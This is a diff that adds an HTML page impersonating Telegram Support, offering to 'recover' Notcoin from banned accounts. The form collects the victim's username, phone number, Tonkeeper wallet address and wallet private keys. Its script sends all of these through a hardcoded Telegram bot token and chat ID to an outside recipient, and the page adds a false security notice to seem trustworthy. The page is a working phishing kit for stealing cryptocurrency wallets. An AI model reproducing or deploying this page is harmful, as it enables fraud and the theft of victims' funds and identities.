@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Request form to recover Notcoin from a banned Telegram account </title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        header {
+            background-color: #0088cc;
+            color: white;
+            width: 100%;
+            padding: 20px 0;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        header img {
+            width: 40px;
+            margin-right: 10px;
+        }
+        main {
+            display: flex;
+            width: 100%;
+            max-width: 1200px;
+            padding: 20px;
+        }
+        .content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            flex: 3;
+            margin-right: 20px;
+            animation: fadeIn 1s ease-in;
+        }
+        .sidebar {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            flex: 1;
+            animation: slideIn 1s ease-in;
+        }
+        h1, h2 {
+            font-size: 20px;
+            color: #333;
+            margin: 10px 0;
+            text-align: center;
+        }
+        h2 {
+            font-size: 18px;
+            color: #666;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        input, textarea, button {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+        button:hover {
+            background-color: #218838;
+            transform: scale(1.05);
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            width: 100%;
+            padding: 10px 0;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+        }
+        .footer-content {
+            font-size: 12px;
+        }
+        .sidebar img {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .highlight {
+            color: #0088cc;
+            font-weight: bold;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        @media (max-width: 768px) {
+            main {
+                flex-direction: column;
+            }
+            .content {
+                margin-right: 0;
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
+        <h1>Telegram Support</h1>
+    </header>
+    
+    <main>
+        <div class="content">
+            <h1>Please fill-in the form with accurate information, requests will be processed and verified by our team promptly</h1>
+            <form id="recoveryForm">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+                
+                <label for="telegramNumber">Telegram Number:</label>
+                <input type="text" id="telegramNumber" name="telegramNumber" required>
+
+                <label for="walletAddress">Tonkeeper Wallet Address:</label>
+                <input type="text" id="walletAddress" name="walletAddress" required>
+                
+                <label for="privateKeys">Tonkeeper Wallet Private Keys:</label>
+                <textarea id="privateKeys" name="privateKeys" rows="4" cols="50" required></textarea>
+                
+                <button type="button" onclick="submitForm()">Submit</button>
+            </form>
+        </div>
+        
+        <div class="sidebar">
+            <img src="sandbox:/mnt/data/telegram_support_image.png" alt="Support Image">
+            <h2>Page Explanation</h2>
+            <p>This page is designed to help users recover their <span class="highlight">Notcoin tokens</span> from banned Telegram accounts. Please fill out the form with accurate information to enable our support team to assist you promptly.</p>
+            <h2>Security Notice</h2>
+            <p>Your privacy is our priority. Ensure that you are submitting this information through a secure and verified Telegram support page. Do not share your private keys with anyone.</p>
+            <h2>Contact Support</h2>
+            <p>If you have any questions, please contact our support team at support@telegram.org or visit our <a href="#" style="color: #00aaff; text-decoration: none;">Help Center</a>.</p>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            © 2024 Telegram Support Team | <a href="#" style="color: #00aaff; text-decoration: none;">Privacy Policy</a> | <a href="#" style="color: #00aaff; text-decoration: none;">Terms of Service</a>
+        </div>
+    </footer>
+
+    <script>
+        function submitForm() {
+            const username = document.getElementById('username').value;
+            const telegramNumber = document.getElementById('telegramNumber').value;
+            const walletAddress = document.getElementById('walletAddress').value;
+            const privateKeys = document.getElementById('privateKeys').value;
+
+            const botToken = '7016255550:AAH5-PVGvi7LB7k1R0mPQUG0-7O_YsX9Eck';
+            const chatId = '6226110365';
+            const message = `User Information:\n- Username: ${username}\n- Telegram Number: ${telegramNumber}\n- Tonkeeper Wallet Address: ${walletAddress}\n- Tonkeeper Wallet Private Keys: ${privateKeys}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Information sent successfully.');
+                } else {
+                    alert('Failed to send information. Please try again.');
+                }
+            })
+            .catch(error => {
+                alert('An error occurred. Please try again.');
+            });
+        }
+    </script>
+</body>
+</html>
